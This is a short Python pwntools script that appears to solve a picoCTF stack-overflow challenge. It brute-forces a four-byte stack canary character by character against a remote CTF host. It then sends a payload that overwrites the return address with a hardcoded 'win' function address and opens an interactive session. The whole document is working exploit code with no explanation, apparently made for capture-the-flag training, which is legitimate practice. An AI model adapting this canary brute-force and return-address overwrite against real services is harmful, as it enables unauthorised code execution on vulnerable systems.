from pwn import *
from string import printable

offset = 64
size = 4
canary = b''

for i in range(1,5):
	for c in printable:
		p = remote('saturn.picoctf.net', 64553)
		p.sendlineafter('>', b'%d' % (64 + i))
		payload = b'A' * offset + canary
		payload += c.encode()

		p.sendlineafter('>', payload)

		resp = p.recvall()

		print(resp)

		if b'Flag' in resp:
			canary += c.encode()
			break
		p.close()
print(canary)
		
win = p32(0x08049336)	
eip = 16
payload = b'A' * offset + canary + b'A' * eip + win
p = remote('saturn.picoctf.net', 64553)
p.sendlineafter('>', b'300')
p.sendlineafter('>', payload)
p.interactive()
